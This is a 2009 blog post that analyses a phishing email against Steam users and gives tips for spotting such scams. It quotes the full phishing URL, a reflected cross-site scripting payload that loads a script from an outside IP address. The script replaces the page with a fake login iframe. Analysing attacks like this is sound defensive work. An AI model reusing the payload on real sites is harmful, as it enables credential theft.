Title: Don't Get Caught In This Steam Phishing Scam - How Phishers Work
Date: 2009-11-02
Author: Seppe "Macuyiko" vanden Broucke

So I just got this mail in my inbox:

![](http://4.bp.blogspot.com/_X4W-h82Vgjw/Su9YncAJhVI/AAAAAAAAPQQ/NilcjCkx6AY/s400/Screenshot1.png)

Needless to say, I was pretty surprised, I didn't know Steam accounts could expire. Sure enough the e-mail looks legit, it's mailed from support@steam.com, didn't get caught by Gmail's spam filter, and the corporate footer looks clean enough. If you have an eye for detail you might notice that there is a space missing here: "click here,login".

Let's check where this link leads to:

![](http://4.bp.blogspot.com/_X4W-h82Vgjw/Su9Zd5oXnvI/AAAAAAAAPQY/jbSCOU8YTno/s400/Screenshot2.png)

    https://cafe.steampowered.com/directory.php?country=AL&amp;state='&gt;<script%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js></script%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js>

"cafe.steampowered.com" certainly looks okay, but now it becomes clear that the state variable has been tampered with. It certainly points to an external script, and putting it in the "phising" folder really doesn't look good... let's open the link. Here's how it looks in Chrome:

![](http://1.bp.blogspot.com/_X4W-h82Vgjw/Su9aZzEIxVI/AAAAAAAAPQg/vAbzAo3HsXw/s400/Screenshot3.png)

And sure enough, the page looks messed up. Let's look at the generated html source:

![](http://3.bp.blogspot.com/_X4W-h82Vgjw/Su9bOIlV7FI/AAAAAAAAPQo/ooF3xbybE4E/s400/Screenshot4.png)

The phishers have now a fully working script tag injected in the source. Let's see what's in there:

![](http://3.bp.blogspot.com/_X4W-h82Vgjw/Su9bmGpVaBI/AAAAAAAAPQ4/cJCtXXdoDwU/s400/Screenshot5.png)

Basically, the phisher is replacing the document body with an iframe which points to an evil url. Let's take a look at that url:

![](http://4.bp.blogspot.com/_X4W-h82Vgjw/Su9b90RfIzI/AAAAAAAAPRA/KW_g8Rt30l8/s400/Screenshot6.png)

Sure enough, it's a fake Steam login page.

Now you might have noticed that the phisher's attack method wasn't working in Chrome. Using Firefox, on the same machine, opening the URL from the mail immediately gives:

![](http://1.bp.blogspot.com/_X4W-h82Vgjw/Su9cxPr7lcI/AAAAAAAAPRI/K1Q_TDa7NAc/s400/Screenshot7.png)

So, what have we learned?

  - Always check mails for spelling mistakes.
  - Always check mail and browser URLs for suspicious content.
  - If available: trust your spam/phishing filter.
  - If you're asked to re-enable your account and you get redirected to a general login page (like the fake on we saw), you can always open a new tab and go to steampowered.com (or other website) by typing it yourself and login that way.

Which actions should be taken?

  - Chrome, Firefox and others should detect this evil site as a phishing site (they detect most of them already, but new ones take a while before they get picked up).
  - Gmail's spam filter failed here, I reported the e-mail as a phishing scam.
  - Steam has an [XSS](http://en.wikipedia.org/wiki/Cross-site_scripting) exploit in their site which they should fix as soon as possible. Never say that "XSS exploits aren't that dangerous"!
